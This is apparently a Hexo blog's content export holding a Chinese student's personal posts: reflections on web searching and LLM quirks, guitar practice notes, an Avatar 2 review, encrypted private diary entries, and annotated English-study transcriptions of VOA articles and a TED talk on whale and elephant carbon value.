<li>配置csapp和xv6的环境时,自己看不太懂lab的框架,只好在互联网上不断地搜索,翻阅了许多的相同的或者超级相似的表明同一个意思的垃圾咨询,只能感慨国内互联网的专业资讯都是在不断地互相抄,毫无创新性,时效性的垃圾(至少有许多是),且没有维护性,知其然不知其所以然</li>
<li>配置vscode在mac下和windows的配置环境时,先是在网上不断找别人写好的四大件,改一改,试一试,不加任何的思考,也不去参阅官方文档,浪费了大量的时间,时间成果转化率极低</li>
</ul>
</blockquote>
<h3 id="搜索要求"><a href="#搜索要求" class="headerlink" title="搜索要求"></a>搜索要求</h3><p>现在我们很多人都是不会搜索,不会以专业的词汇来描述自己的问题,就根本找不到,只能接受到大量的广告和毫不相干的网站.好比我之前不知道EOF这个术语,导致用各种其他语言都无法搜索到实现EOF这个功能的按键.</p>
<blockquote>
<p>EOF，为End Of File的缩写，通常在文本的最后存在此字符表示资料结束。</p>
</blockquote>
<p>想要提高搜索的效率,我认为有以下几个选项</p>
<p>遇到不懂的便系统性学习这个方面的知识,建立完善的脉络</p>
<p>设立一个区分性,想清楚几个事物间的关联性和重要性,比如我配置hexo的主题和我写博客其实没有什么关系,所以理智告诉我在挣扎了半个小时不得果时我应该放弃,去干与当下更有收益的事情.</p>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><h4 id="对大模型的思考"><a href="#对大模型的思考" class="headerlink" title="对大模型的思考"></a>对大模型的思考</h4><p>发现现在的大模型有个缺点就是缺少了一些偏门知识点的语料,或者说是上古时代至今的语言进化史留下来的老而僵的死东西,比如在函数声明里面写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void franc(int = 1, int = 2)&#123;</span><br><span class="line">    int x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    cout&lt;&lt;x*2;    </span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    franc(4, 3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gpt会毫不犹豫的纠正你,但这个确实是能跑的,导致我一度怀疑这样子的写法有何意义<del>,但他做函数声明时这样写确实emmm也不好说,先放着吧</del></p>
<h4 id="对自己的反思"><a href="#对自己的反思" class="headerlink" title="对自己的反思"></a>对自己的反思</h4><p>自己对盲目的搜索产生了依赖性,很多细碎的知识点,最好的学习方法因该是挑个有空的时间去研究一整个体系结构,从最底层学起,而不是什么都依靠搜索,搜索是建立在知道大家把这种东西叫什么的基础上的,没有基础的认知,想要依靠模糊搜索只会浪费大量的时间,要去衡量花费的预计时间成本,及时止损.</p>
<p>多多思考,多多进步</p>
<h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote>
<p>愿汝之体恒满精力，愿汝之心恒葆青春。</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>思考</tag>
        <tag>互联网</tag>
      </tags>
  </entry>
  <entry>
    <title>guitar_learn</title>
    <url>/PLAY/guitar_learn/2024/01/10/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这几日学了吉他，试图看到吉他的大门，才恍然间发现自己的音准很差，听不出音，每天也不怎么练琴，断断续续练了十几二十天，勉强把爱的罗曼史弹完，现在脱离了<a href="https://space.bilibili.com/87918598/channel/collectiondetail?sid=185860">吉他大学霸的基础课</a>,转而投向了<a href="https://space.bilibili.com/326251291/channel/collectiondetail?sid=434227&ctype=0">元子弹吉他</a>的基础课,主要是感觉吉他大学霸讲的属实是找不到什么练琴的快感，太枯燥了，练琴是为了开心，就应该去弹曲子，这才是正路，有着强烈的正反馈，而不是天天练基本功折磨自己。目前已经在击弦努力了，预计是每天练会一门课，同时对之前的课程谱子进行复习，争取稳扎稳打，每日都有练习</p>
<h3 id="会的曲子"><a href="#会的曲子" class="headerlink" title="会的曲子"></a>会的曲子</h3><ol>
<li><a href="https://www.bilibili.com/video/BV1Vb411c7x5/?spm_id_from=333.337.search-card.all.click">《爱的罗曼史》</a></li>
<li><a href="https://www.bilibili.com/video/BV1x4411U7n7/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">《少年的梦》</a></li>
</ol>
<h3 id="喜欢的曲子"><a href="#喜欢的曲子" class="headerlink" title="喜欢的曲子"></a>喜欢的曲子</h3><ol>
<li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=31&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek美国达人秀（命运交响曲和toxicity)</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=33&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek-Moonlight Sonata(月光奏鸣曲)</a></p>
</li>
</ol>
<h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote>
<p>愿能有所成长，有所进步</p>
</blockquote>
]]></content>
      <categories>
        <category>PLAY</category>
      </categories>
      <tags>
        <tag>学习笔记，guitar</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】浅谈阿凡达2</title>
    <url>/PASTFUTURE/2/2023/12/14/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>今日，于发呆之中畅想人生，浅浅做了一套四级卷子之后，便查阅起我的电影仓库，恍然间发现，半年多前加入库中的《阿凡达2》竟然迟迟未看，便将其看完，中途及结束有诸多感慨</p>
</blockquote>
<h2 id="大致观感"><a href="#大致观感" class="headerlink" title="大致观感"></a>大致观感</h2><p>初掠此影片，一打眼便是《阿凡达1》的传统风格，色彩绚丽奇幻，特效精美绝伦，确实是一部好莱坞的质量过关的大作，但也仅限如此。</p>
<p>在前半段困惑于其主题：水之道。水在哪？故事情节无非就是天空人再次降临潘多拉，侵占潘多拉，然后主角（已化为阿凡达）带领家庭逃离，对就是逃离。以保护家庭为理由换了一个部落——海部落寻求存亡，然后又发生一把战斗，便草草收场。让我不经怀疑，这废了老大的劲才干掉了天空人的一艘捕猎号，意义何在？保护了家人？自己儿子还死了一个。如果说，导演组没活了下一次可以搞个草之道，沙漠之道，再出一点小怪兽，然后再来一场家庭的戏码，保护家人，和反牌继续打复活赛。这完全的架空世界观可以让这个系列持续的播下去，十年一部就等了个这个纯纯的动效电影，毫无深意或者说是老套的剧情可言，全篇的家庭，族人的情节渲染使得我很难认真的去看这猜的到走向的故事发展<del>本还以为主角会带领图琨进攻人类基地，毕竟在开始确实给了基地一个俯拍的视角，谁知就出现了一下</del>，只能说这部影片浪费了我的三个小时，或者说我已三个小时满足了心中的情怀吧。</p>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>daily</tag>
        <tag>电影</tag>
      </tags>
  </entry>
  <entry>
    <title>日常杂记</title>
    <url>/PASTFUTURE/daily_write/2023/12/09/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="梦里啥都有!" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="77e17f4f8c44fdcb2b39c60f3ad716b4e09869f41daebc34af176f67b19b9c8f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">吃点好的吧你!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>daily</tag>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>Coral reef</title>
    <url>/VOA/VOA_1/2024/02/01/</url>
    <content><![CDATA[<h1 id="Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast"><a href="#Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast" class="headerlink" title="Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast"></a>Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast</h1><blockquote>
<p><a href="https://www.51voa.com/VOA_Special_English/scientists-map-largest-deep-sea-coral-reef-off-us-atlantic-coast-92138.html">The MP3</a></p>
</blockquote>
<h2 id="The-article"><a href="#The-article" class="headerlink" title="The article"></a>The article</h2><h3 id="Map-the-coral-reef"><a href="#Map-the-coral-reef" class="headerlink" title="Map the coral reef"></a>Map the coral reef</h3><p>Scientists have mapped the largest <strong>coral reef</strong> off America’s Atlantic coast.</p>
<p>Researchers say the reef stretches about 500 kilometers from Florida to South Carolina. At some points, it is 109 kilometers wide. The researchers measured the reef using <strong>3D</strong> mapping technology.</p>
<p>“It’s eye-opening – it’s breathtaking in <strong>scale</strong>,” Stuart Sandin told The Associated Press. He is a marine biologist at the Scripps Institution of Oceanography<code>the Scientific study of Ocean</code>. Sandin was not included in the research.</p>
<p>Ocean scientists have known since the 1960s that some coral life was present off the Atlantic Coast. But the reef’s exact size had remained a mystery. New underwater mapping technology made it possible to construct images of the ocean floor in three dimensions.</p>
<h3 id="Deep-coral-reef"><a href="#Deep-coral-reef" class="headerlink" title="Deep coral reef"></a>Deep coral reef</h3><p>The largest yet known deep coral reef “has been right under our noses, waiting to be discovered,” said Derek Sowers. He is an oceanographer at the nonprofit group <a href="https://nautiluslive.org/">Ocean Exploration Trust</a>.</p>
<p>Sowers and other scientists recently released maps of the reef in the publication <em>Geomatics</em>(在这里是一种出版物).</p>
<p>The reef was found at ocean depths from 200 to 1,000 meters. Deep-sea life cannot use sunlight to carry out <strong>photosynthesis</strong>. Instead, reef corals at extreme depths must <strong>filter</strong> food particles<code>a small piece of something</code> out of the water for energy.</p>
<p>Deep coral reefs are known to contain animals such as sharks, swordfish<code>a large fish with a sword on its head</code>, sea stars, octopus<code>a creature with eight tentacles</code>, shrimp and many kinds of fish.</p>
<h3 id="Tropical-coral-reefs"><a href="#Tropical-coral-reefs" class="headerlink" title="Tropical coral reefs"></a>Tropical coral reefs</h3><p>Unlike deep coral reefs, tropical<code>coming from the hottest parts of the world</code> reefs are better known to scientists and sea explorers alike because they are easier to reach. The world’s largest tropical coral reef system, Australia’s Great Barrier Reef, stretches for 2,300 kilometers.</p>
<p>Sowers said it is possible larger deep-sea reefs will be discovered in the future since only about 25 percent of the world’s ocean floor has been mapped in 3D. Only 50 percent of U.S. offshore waters have been mapped. Maps of the ocean floor are created using high-technology sound equipment, called sonar, on ships.</p>
<p>Erik Cordes is a marine biologist at Temple University and a co-writer of a study on the mapping operation. He said deep reefs cover more of the ocean floor than tropical reefs. But both are currently facing similar risks, including climate change and damage from oil and gas exploration activities</p>
<p align="right">I'm Bryan Lynn</p>
<p align="right">Edit by Vite</p>

<h2 id="Some-information"><a href="#Some-information" class="headerlink" title="Some information"></a>Some information</h2><h3 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h3><p><strong>coral</strong> <em>– n.</em> a hard, usually pink or white substance produced by a type of small sea animal</p>
<p><strong>reef</strong> <em>– n.</em> a collection of rocks or sand that sits below the surface of the ocean</p>
<p><strong>3D (three dimensional)</strong> –adj. showing the height, width and length of something rather than just two dimensions</p>
<p><strong>scale</strong> <em>– n.</em> the size or level of something</p>
<p><strong>photosynthesis</strong> <em>– n.</em> the process by which a plant uses carbon dioxide from the air, water from the ground, and the energy from the light of the sun to produce its own food and oxygen</p>
<p><strong>filter</strong> <em>– v.</em> to pass a substance through a piece of equipment in order to remove solid pieces or other substances</p>
<h3 id="Chinese-Translation"><a href="#Chinese-Translation" class="headerlink" title="Chinese Translation"></a>Chinese Translation</h3><blockquote>
<p>科学家们绘制了美国大西洋沿岸最大的珊瑚礁的地图。</p>
<p>研究人员说，珊瑚礁从佛罗里达延伸到南卡罗来纳州约500公里。在某些地方，它是109公里宽。研究人员使用3D测绘技术测量了珊瑚礁。</p>
<p>“这是大开眼界-它的规模惊人，”斯图尔特桑丁告诉美联社。他是斯克里普斯海洋研究所的海洋生物学家。桑丁没有被包括在研究中。<br>自20世纪60年代以来，海洋科学家就已经知道大西洋沿岸存在一些珊瑚生命。但珊瑚礁的确切大小仍然是个谜。新的水下测绘技术使绘制海底三维图像成为可能。</p>
<p>迄今为止已知的最大的深海珊瑚礁“就在我们的鼻子底下，等待着被发现，”德里克·索沃斯说。他是非营利组织海洋探索信托基金会的海洋学家。</p>
<p>Sowers和其他科学家最近在Geomatics出版物中发布了珊瑚礁的地图。</p>
<p>珊瑚礁是在200至1,000米的海洋深处发现的。深海生物不能利用阳光进行光合作用。相反，在极端深处的珊瑚礁必须过滤水中的食物颗粒以获取能量。</p>
<p>众所周知，深海珊瑚礁中有鲨鱼、旗鱼、海星、章鱼、虾和许多种类的鱼。</p>
<p>与深海珊瑚礁不同，热带珊瑚礁更容易被科学家和海洋探险家所了解，因为它们更容易到达。世界上最大的热带珊瑚礁系统，澳大利亚的大堡礁，绵延2,300公里。</p>
<p>Sowers说，未来可能会发现更大的深海珊瑚礁，因为世界上只有大约25%的海底被绘制成3D地图。只有50%的美国近海沃茨被绘制成地图。海底地图是使用船上的声纳绘制的。</p>
<p>Erik Cordes是坦普尔大学的海洋生物学家，也是一项关于测绘工作的研究的合著者。他说，深海珊瑚礁比热带珊瑚礁覆盖更多的海底。但两者目前都面临着类似的风险，包括气候变化和石油和天然气勘探活动造成的损害.</p>
</blockquote>
]]></content>
      <categories>
        <category>VOA</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>VOA</tag>
      </tags>
  </entry>
  <entry>
    <title>张锦洲的反思</title>
    <url>/PASTFUTURE/check/2024/02/01/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="梦里啥都有!" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="3ab0588dcd7f67c527e84126bff2e27c7a6c197667c93da77cca562964fe00e4"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">吃点好的吧你!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>daily</tag>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>worth and economy详解</title>
    <url>/TED/TED_1/2023/12/19/</url>
    <content><![CDATA[<h2 id="What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature"><a href="#What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature" class="headerlink" title="What a living whale is worth – and why the economy should protect nature"></a>What a living whale is worth – and why the economy should protect nature</h2><p><strong>Ralph Chami |TED2022| April 2022</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AC4y197vF/?spm_id_from=333.880.my_history.page.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">一条活蓝鲸值多少钱？比你想象的多得多【TED演讲】_哔哩哔哩_bilibili</a></p>
<p><a href="https://pic.imgdb.cn/item/658184edc458853aef58b9a7.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320264.png"></a></p>
<p>In 2017, I confided( to tell someone you trust about personal things that you do not want other people to know) in a dear friend of mine that my lifelong wish was to see the blue whales. Before I knew it, I found myself with a bunch of researchers in the Sea of  <strong>Cortez</strong>（科尔特斯海） studying the blue whales. We used to be in a boat 25 foot long. And next to us … is this majestic（雄伟的，壮丽的） creature feeding gracefully next to us.</p>
<h2 id="Carbon-sequestration-of-the-whales-system"><a href="#Carbon-sequestration-of-the-whales-system" class="headerlink" title="Carbon sequestration of the whales system"></a>Carbon sequestration of the whales system</h2><p>Now you have to understand, at that point in time, I knew nothing about blue whales, or whales in general. I’m just a financial economist. But I learned something from them, which was really incredible.  It was already known in the science that whales capture so much carbon on their body and indirectly. And that’s, of course, very important for us because we are all facing the climate <strong>calamity</strong>（灾难，祸患） and we are all talking about how to grab carbon dioxide from the atmosphere. </p>
<p>Well, it turns out that the whales grab so much carbon dioxide from the atmosphere – by the way(顺便说, they eat and they <strong>poop</strong>(拉屎）. Yeah. It’s all about food. So how does the whale system work?</p>
<ol>
<li><h3 id="phytoplankton"><a href="#phytoplankton" class="headerlink" title="phytoplankton"></a>phytoplankton</h3><p> Well, it starts in the oceans. There’s these <strong>microscopic</strong> <strong>organisms</strong>（生物，有机体) called <strong>phytoplankton</strong>. (植物，浮游生物）Those phytoplankton do something really incredible. They grab so much carbon dioxide from the atmosphere, and they return oxygen to all of us.  Now how much carbon dioxide do they grab from the atmosphere? About 37 <strong>gigatons</strong>（十亿吨级） of carbon dioxide from the atmosphere. Truly the lungs of the planet are in the ocean. Now, if you want to visualize what 37 gigatons mean, that’s the <strong>equivalent</strong> of the carbon that is grabbed by four Amazon forests per year. That’s how much is being sucked in by these <strong>photosynthetic</strong>（光合作用） organisms. </p>
</li>
<li><h3 id="krill"><a href="#krill" class="headerlink" title="krill"></a>krill</h3><p>Now larger creatures called <strong>krill</strong>（ small shellfish）, love to eat phytoplankton directly or indirectly. And the whales love to feed on the krill. They feed so much on the krill that they grow bigger and bigger, and they store carbon in their body.  How much carbon do they store in their body? </p>
</li>
<li><h3 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h3><p>Roughly about seven to nine tons of carbon on their body. If you want to <strong>convert</strong>(转换) that to carbon dioxide, that’s about 33 tons of carbon dioxide being kept out of the atmosphere on the body of a single whale. If you want to visualize that, that’s the work of 1,500 trees on the body of a single whale. OK? But those guys, because they eat a lot, what do you do next? You poop a lot. And their poop turns out to be incredibly important because it fertilizes（受精，施肥[to put fertilizer on the soil to make plants grow]） the phyto(一种植物？）. So you have this wonderful cycle. OK? The whale feeds on the krill, the krill feeds on the phyto, and the phyto eats the poop of the whales to get more active. And when the phyto gets more active, it grabs more carbon dioxide from the atmosphere. So just imagine: the whales, they capture carbon on their body. Unfortunately, at some point they die, and they’re so heavy they sink to the bottom of the ocean. And anything below a thousand meters is sequestered(a sequestered place is quiet and far away from people) almost forever. And through their poop they also fertilize phyto, making phyto even more active, grabbing more carbon dioxide from the atmosphere.</p>
</li>
</ol>
<h2 id="The-bad-status-of-the-whales"><a href="#The-bad-status-of-the-whales" class="headerlink" title="The bad status of the whales"></a>The bad status of the whales</h2><p>So in a sense, the whales are incredible allies（同盟国） in the fight against climate change. Now that’s good news, right? Yeah.  Except that whales are dying. They’re dying from ship strikes. They’re dying from pollution, they’re dying from entanglements(纠缠，铁丝网围栏）. In fact, they’re dying because our current economic system puts a zero value on a living whale. But chop（<strong>cut some thing</strong>) a whale, sell it for its meat, it acquires a value. The value of a living whale is zero, zero dollars, zero in any currency（货币）.I’m a financial economist. And I’m listening to these scientists bemoaning(<strong>complain disappointed about some things</strong>) what’s happening to the whales. And I wanted to help. I didn’t know how to help. And I thought, wait a minute. Maybe I can bring your message to the audiences around the world. Maybe I can translate all of that value, those services they do for us in a language that we can all understand. </p>
<h2 id="translate-the-value"><a href="#translate-the-value" class="headerlink" title="translate the value"></a>translate the value</h2><p>Unfortunately, it’s a language of dollars and cents. So I set out with my team to value the services of a whale but one service – because the whales do a whole host of things. But I just wanted to value one thing, which is what is the value of their carbon sequestration(扣押) service to us? </p>
<p>Now how would you do something like that? After all, the whale is a living system. The whale captures carbon on her body, and she gives birth to baby whales who also grow up to capture carbon on their body. And they give birth to whales and so forth, and indirectly through the fertilization of phyto. So how would you do something like this? </p>
<p>Well, to do that, </p>
<p>I had to resort to what I do best, which is valuation. I looked at it, I said, wait a minute. This looks like a share of stock（股票） that pays dividends（红利）.Except those dividends are live dividends. They give birth to more dividends. So if I were to track the whale over her lifetime and keep track of all these dividends into the future, and then multiply that by the price of carbon, and discount（折价，折现，忽视） that all the way to the present, I can figure out what is the present value, discounted present value, of the lifetime earnings of a single whale. Would you like to know how much?</p>
<p>Would you like to know how much?（重复）</p>
<p>Audience: Yes!</p>
<p>RC: At least three million dollars. At least. Because I’m leaving so much out of this. But I just wanted to tell the good news that I heard on that boat. I didn’t know what to do. I was trying to help them out. But there’s more good news. Would you like to hear it?</p>
<p>Audience: Yes!</p>
<h2 id="Carbon-sequestration-of-the-other-creatures"><a href="#Carbon-sequestration-of-the-other-creatures" class="headerlink" title="Carbon sequestration of the other creatures"></a>Carbon sequestration of the other creatures</h2><ul>
<li><h3 id="elephants"><a href="#elephants" class="headerlink" title="elephants"></a>elephants</h3></li>
</ul>
<p>RC: Their cousins on land, the elephants in the forests of Africa, in the Congo Basin, （刚果盆地） they do the same thing. Turns out the way they walk and they eat and they poop, they increase carbon sequestration（扣押） in the trees, in the forests between seven and 14 percent. Just imagine, just by <strong>frolicking</strong>（play happily) around, they’re helping us to grab carbon dioxide from the atmosphere and fix it. So I thought, hey, maybe, maybe we can value their services too. Right? Same thing. But again, use the same model of valuation. You follow the same methodology（ the set of methods）, and you discount all of that to the present. And you ask yourself, what is the value of a single elephant’s carbon sequestration service? Would you like to know how much?</p>
<p>Audience: Yes!</p>
<p>RC: Here we go. 2.6 million dollars. Would you like to hear some more good news?</p>
<p>Audience: Yes!</p>
<ul>
<li><h3 id="forests"><a href="#forests" class="headerlink" title="forests"></a>forests</h3></li>
</ul>
<p>RC: Aside from forests – because we are land people, we just think of forests – go a little bit into the water. Sea grass, salt marsh（沼泽） mangroves（红树）, kelp（巨藻） forests, peat（泥炭） lands, wetlands – these are living systems that suck in so much carbon dioxide beyond your imagination, and they keep it forever in their roots as long as you leave them alone and you look after them .So … If you think these numbers are big, wait till you see what I’m about to tell you next. In sea grass alone, sea grass alone, carbon sequestration. How much do you think is the value of the global – If you look at globally the sea grass and you value their carbon sequestration service, how much you think it’s worth? You ready? 2.3 trillion dollars. That’s the size of the German stock market. </p>
<p>Now. What does this tell us? This tells us that a living and thriving（ a thriving company, business etc is very successful，欣欣向荣） nature is not only valuable intrinsically（本质的，内在的）, it’s also financially valuable to us. Question is, what do you do with this? So the science tells us what a wondrous Earth we are on. We can value it in dollars and cents. Question is, what are you going to do with it? Well, guess what? We can build a whole economy around a living and thriving nature, not an extractive（摘录的，片面的） view of nature, but a regenerative view of nature. And that economy –Thank you.</p>
<h2 id="The-way-to-build-the-economy"><a href="#The-way-to-build-the-economy" class="headerlink" title="The way to build the economy."></a>The way to build the economy.</h2><p>That economy is going to deliver for us sustainable and shared prosperity（兴隆） for all, big and small, all creatures on this planet. It does not have to be I win, you lose. It is a win-win. I’m going to show you how.From there we can build – In order to build that economy, we need three things. We need the science, the accounting, the scientific accounting. What is it that you have? How much of it do you have? Then people like me, financial economists, come around and they say, “What is the value of what you have?” The reason we value it is just to basically translate it into the language that policymakers can understand so they can make decisions. That’s all. It’s a translation. But then the third pillar is very important, which is the legal framing. The legal framing is very important because we need to protect the rights of nature, a living and thriving nature. Three things. Once you do these three things, you can create markets around nature. When I say markets around nature, not an extractive view of nature, but a regenerative view of nature. And I’m going to show you how. </p>
<p>I’m going to show you how. Gabon has 57,000 elephants. If you leave them alone, they can grow to 195,000 elephants. Gabon can sell the carbon offsets of its elephants. Imagine – because those elephants are grabbing carbon in the trees – they can sell the carbon offsets of their elephants. To whom? To us because we’re all enamoured（依恋的，迷恋的） with going carbon zero, carbon negative, carbon neutral（中立的）. And our money will come in to look after these elephants in perpetuity（永久的）. OK? So how much revenue（收入） can Gabon get out of it? One billion dollars a year from allowing these elephants to frolic freely, not be tied to anything, just by leaving them alone. Those elephants, by the way, they walk, they poop, just being, having babies, doing whatever they do, they help carbon sequestration in the forests.  </p>
<h2 id="The-nature-and-the-economy"><a href="#The-nature-and-the-economy" class="headerlink" title="The nature and the economy."></a>The nature and the economy.</h2><p>A forest without animals is dead. It’s not about flora（植物群）. It’s about flora and fauna（动物群）. It’s about nature itself. That’s what the message is. Who would buy these carbon offsets? All these companies and countries that made commitments to carbon zero, carbon negative, carbon neutral. They would buy the carbon offsets, or carbon credits if you like. The money would flow in from these ecosystem services – be it the whales, be it the elephants, be it mangrove（红树，一种热带作物）, sea grass, salt marsh – and the money goes in by contract（<strong>合同</strong>）, using block chain（区块链） technology to look after nature in perpetuity – very important – and to look after the stewards（男服务员，主管） of nature in perpetuity. And the stewards of nature are the local and the indigenous（土生土长的） population. They’re the ones who are doing the conservation（保护工作）, not you and me.</p>
<p>Once we do that – Notice what it is. It’s a win for nature. It’s a win for the economy. The government will make money because the government is going to get all that revenue. It will change its fiscal（财政的） stance. It will diversify its economy. It will grow in a sustainable way. It’s a win for the environment. It’s a win for all of these creatures that have suffered so much at our hands. It’s a win for this beautiful Earth of ours. As Carl Sagan once said, “The only Earth we’ll ever know. The only home we’ll ever know.” It’s a win for us. We are taking this work <strong>in Africa to Liberia（利比里亚）, Cameroon（柯麦隆）, Kenya（肯尼亚）, South Africa</strong>. We’re taking this work to <strong>the Americas, Chile（智利）, Argentina</strong>（阿根廷）. We’re doing it in the US and in the UK. Imagine, it just started with just a wish of mine to see a blue whale. Little did I know it’s going to end up with a vision of how we ought to live for tomorrow .</p>
<p>Thank you.</p>
<p>(Applause)</p>
]]></content>
      <categories>
        <category>TED</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>TED</tag>
      </tags>
  </entry>
  <entry>
    <title>Quasar</title>
    <url>/VOA/VOA_2/2024/02/27/</url>
    <content><![CDATA[<p><a href="https://www.51voa.com/VOA_Special_English/scientists-identify-possibly-brightest-object-in-the-universe-92293.html">MP3</a></p>
<p><em>By Bryan Lynn</em><br><em>25 February 2024</em></p>
<p>Astronomers say they may have discovered the brightest object ever observed in the universe.</p>
<p>The discovery involves a distant space object known as a <strong>quasar</strong><code>an object in space that is similar to a star and that shines very brightly</code>. The American space agency NASA <a href="https://www.nasa.gov/universe/nasas-webb-will-use-quasars-to-unlock-the-secrets-of-the-early-universe/">describes</a> quasars as “very bright, distant and active supermassive black holes that are millions to billions of times the mass of the Sun.”</p>
<p>A quasar’s light “outshines” all other stars and “its jets and winds shape” its galaxy, NASA adds.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402270754572.jpeg" alt="This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser/ESO via AP)"><br><strong>This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser&#x2F;ESO via AP)</strong></p>
<p>A team led by Australian researchers identified the super bright quasar. The European Southern Observatory’s (ESO’s) Very Large Telescope, based in northern Chile, collected most of the data. Additional data came from Australia’s Siding Spring Observatory.</p>
<p>The researchers estimate the record-breaking quasar is at least 500 trillion times brighter than our own sun. The team also noted the black hole powering the object is more than 17 billion times larger than our sun.</p>
<p>The quasar is about 12 billion light years away from Earth. It is thought to have existed since the early days of the universe. A light year is the distance light travels in a year – about 9.5 trillion kilometers.</p>
<p>The object was already known and had been studied before. But scientists say it was misidentified in the past as a star. The newly identified quasar is so large that its black hole could easily swallow at least one sun per day, the team said.</p>
<p>The researchers recently reported their finding <a href="https://www.nature.com/articles/s41550-024-02195-x">in a study</a> in the publication <em>Nature Astronomy</em>.</p>
<p>The quasar appears only as a small dot in images. But scientists say they imagine it to be a very powerful and active place. The team says the black hole is thought to have a circulating <strong>disk</strong> containing gas and other matter from swallowed stars. The disk spins continuously like an intense, active storm.</p>
<p>“This quasar is the most violent place that we know in the universe,” said the lead writer of the study, Christian Wolf. He is an astronomer and professor in the College of Science at Australian National University.</p>
<p>The ESO first found the object, known as J0529-4351, in 1980. At the time, it was identified, or classified, as a star. Then last year, it was identified as a quasar.</p>
<p>The latest observations and computer modeling suggest the quasar is taking in amounts of material equal to about 370 suns a year, or about one per day. The team says more observations will be needed to fully understand the object’s growth rate.</p>
<p>Priyamvada Natarajan is a professor of astronomy and physics at Yale University. She was not part of the latest study. But Natarajan told the Associated Press, “The exciting thing about this quasar is that it was hiding in plain sight and was misclassified as a star previously.”</p>
<p>Study co-writer Christopher Onken added, “It is a surprise that it has remained unknown until today, when we already know about a million less <strong>impressive</strong> quasars.”</p>
<p>The researchers say finding and studying distant supermassive black holes could help astronomers learn important details about the birth and development of the early universe. But study leader Wolf noted that he also gets enjoyment out of the search itself.</p>
<p>“Personally, I simply like the chase,” he <a href="https://www.eso.org/public/news/eso2402/">said</a> in a statement. “For a few minutes a day, I get to feel like a child again, playing treasure hunt. And now, I bring everything to the table that I have learned since.”</p>
<p>Future research is expected to center on the history of the quasar and measuring its growth and development. The team noted that some of this data should be easier to collect after the Very Large Telescope receives an instrument <strong>upgrade</strong>. The upgrade, known as Gravity+, is designed to provide more exact measurements of the mass of distant black holes.</p>
<p>In addition, the ESO plans to launch a future observer, called the Extremely Large Telescope (ELT), in Chile’s Atacama Desert. That telescope, the researchers say, will improve on current identification and study methods to identify such distant objects.</p>
<p align="right">I'm Bryan Lynn</p>
<p align="right">Edit by Vite</p>

<p><em>Bryan Lynn wrote this story for VOA Learning English, based on reports from The Associated Press and the European Southern Observatory.</em></p>
<p><strong>—————–</strong></p>
